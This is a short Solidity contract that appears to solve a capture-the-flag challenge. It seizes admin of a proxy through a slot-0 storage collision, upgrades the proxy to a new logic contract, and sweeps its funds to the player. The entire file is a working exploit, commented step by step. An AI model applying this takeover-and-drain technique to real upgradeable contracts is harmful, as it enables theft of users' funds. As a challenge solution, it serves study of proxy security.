// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "./Challenge.sol";

contract Solution {
    function solve(Setup setup) external {
        SimpleProxy proxy = setup.proxy();

        // 1) Take over admin via storage collision (slot0)
        // IMPORTANT: set admin to THIS solver contract, because calls to proxy come from this contract.
        uint256 payload = uint256(uint160(address(this)));
        (bool ok1,) = address(proxy).call(
            abi.encodeWithSignature("setValue(uint256)", payload)
        );
        require(ok1, "takeover failed");

        // 2) Upgrade to LogicV2 (now msg.sender == admin, because admin == address(this))
        LogicV2 v2 = new LogicV2();
        proxy.upgradeTo(address(v2));

        // 3) Sweep via proxy (delegatecall into LogicV2.sweep) to the PLAYER (msg.sender of solve)
        (bool ok2,) = address(proxy).call(
            abi.encodeWithSignature("sweep(address)", payable(msg.sender))
        );
        require(ok2, "sweep failed");
    }
}